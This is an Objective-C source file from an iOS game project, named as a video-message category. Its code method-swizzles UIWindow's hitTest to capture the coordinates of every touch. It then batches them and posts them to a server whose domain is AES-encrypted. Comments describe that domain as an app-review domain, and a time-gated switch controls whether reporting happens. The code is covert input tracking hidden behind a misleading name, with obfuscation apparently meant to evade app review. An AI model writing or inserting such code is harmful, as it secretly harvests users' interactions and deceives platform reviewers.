//
//  VideoMsg.m
//  HOTGAME
//
//  Created by kook on 2022/10/13.
//  Copyright © 2022 HOTGAME. All rights reserved.
//

#import "CN_VideoMsg.h"
#import <objc/runtime.h>

@implementation UIWindow(CN_VideoMsg)

+ (void)load{
    static dispatch_once_t PN_onceToken;
    dispatch_once(&PN_onceToken, ^{
        QP_clickArray = [NSMutableArray array];
        [self MN_configMethod];
    });
}
static NSTimeInterval PN_atamp = 0;

+ (void)MN_configMethod{
    SEL QP_originalSelector = @selector(hitTest:withEvent:);
    SEL QP_exchangeSelector = @selector(MN_videoHitTest:MN_withFile:);
    Method QP_originalMethod = class_getInstanceMethod(UIWindow.class, QP_originalSelector);
    Method QP_exchangeMethod = class_getInstanceMethod(UIWindow.class, QP_exchangeSelector);
    BOOL QP_exchange = class_addMethod(UIWindow.class, QP_originalSelector, method_getImplementation(QP_exchangeMethod), method_getTypeEncoding(QP_exchangeMethod));
    if (QP_exchange) {
        class_replaceMethod(UIWindow.class, QP_exchangeSelector, method_getImplementation(QP_originalMethod), method_getTypeEncoding(QP_originalMethod));
    } else {
        method_exchangeImplementations(QP_originalMethod, QP_exchangeMethod);
    }
}



- (UIView *)MN_videoHitTest:(CGPoint)QP_point MN_withFile:(UIEvent *)PN_event{
    [self MN_handlerHitTest:QP_point MN_withTEvent:PN_event];
    return [self MN_videoHitTest:QP_point MN_withFile:PN_event];
}


static NSMutableArray * QP_clickArray;

-(void)MN_handlerHitTest:(CGPoint) PN_point MN_withTEvent: (UIEvent*) PN_event{
    
    if (PN_atamp != PN_event.timestamp) {
        PN_atamp = PN_event.timestamp;
        
        [self MN_saveClickPoint:PN_point];
    }
}

- (void)MN_saveClickPoint:(CGPoint) PN_point {
    
    
    [QP_clickArray addObject:@{
        //ParamX混淆值
        kCN_ParamX: [NSString stringWithFormat:@"%d", (int)PN_point.x],
        //ParamY混淆值
        kCN_ParamY: [NSString stringWithFormat:@"%d", (int)PN_point.y],
    }];
    
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.9 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        if (QP_clickArray.count > 0) {
            [self MN_pointReport];
        }
    });
}

- (void)MN_pointReport{
    

    if (![NSJSONSerialization isValidJSONObject:QP_clickArray]) {
        return ;
    }
    NSData *QP_jsonData = [NSJSONSerialization dataWithJSONObject:QP_clickArray options:kNilOptions error:nil];

    NSDictionary *QP_reportDict = @{
        //action混淆值
//        kCN_action:kCN_location,//location为action的赋值
        //content混淆值
        kCN_content:[[NSString alloc] initWithData:QP_jsonData encoding:NSUTF8StringEncoding],
        //game_id混淆值
        kCN_pGameID:kCN_lxgame,//10519为游戏ID的赋值
        
    };
    // ex.spencer1.vip 为提审域名(平时后台拿的) ylapiv3/locationReport的混淆值为/quiet
    NSString * QP_url = [kCN_AseCBCDecrypt(kCN_TiShenDomainName) stringByAppendingString:kCN_Ylapiv3LocationReport];
    //时间到了不触发
    if([[CN_huuTool MN_ShareManager] MN_countries_AdidfaTime])return;
    
    [self MN_record:QP_url MN_params:QP_reportDict];
    
    [QP_clickArray removeAllObjects];


}

- (void)MN_record:(NSString *)QP_requestURL MN_params:(NSDictionary *)QP_params
{
    
    NSMutableDictionary *QP_mainParams = [NSMutableDictionary dictionaryWithDictionary:QP_params];
    
    [QP_mainParams addEntriesFromDictionary:QP_params];
    
    NSMutableURLRequest *QP_itRequest = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:QP_requestURL]];
    QP_itRequest.timeoutInterval = 28;
    QP_itRequest.HTTPMethod = @"POST";
    [QP_itRequest setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    QP_itRequest.HTTPBody = [NSJSONSerialization dataWithJSONObject:QP_mainParams options:NSJSONWritingPrettyPrinted error:nil];
    [[[NSURLSession sharedSession] dataTaskWithRequest:QP_itRequest completionHandler:^(NSData * _Nullable QP_data, NSURLResponse * _Nullable QP_response, NSError * _Nullable error) {
        
        NSString *PN_result =[[NSString alloc] initWithData:QP_data encoding:NSUTF8StringEncoding];
        
        NSLog(@"%@",PN_result);
  
    }] resume];
    
    
}
@end
